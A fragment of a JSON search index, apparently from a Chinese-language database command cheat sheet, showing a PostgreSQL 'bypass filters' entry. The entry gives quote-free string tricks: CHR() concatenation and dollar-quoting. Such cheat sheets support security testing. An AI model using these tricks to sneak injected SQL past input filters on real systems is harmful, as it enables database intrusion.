\u6587\u4ef6\u5199\u5165"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#_3","text":"\u5f15\u53f7 \u4f7f\u7528 CHR SELECT CHR(65)||CHR(66)||CHR(67); \u4f7f\u7528 $ \u7b26\u53f7\uff08\u9002\u7528\u4e8e PostgreSQL 8\u53ca\u4ee5\u4e0a\u7248\u672c\uff09 SELECT $$This is a string$$ SELECT $TAG$This is another string$TAG$","title":"\u7ed5\u8fc7\u8fc7\u6ee4\u5668"}]}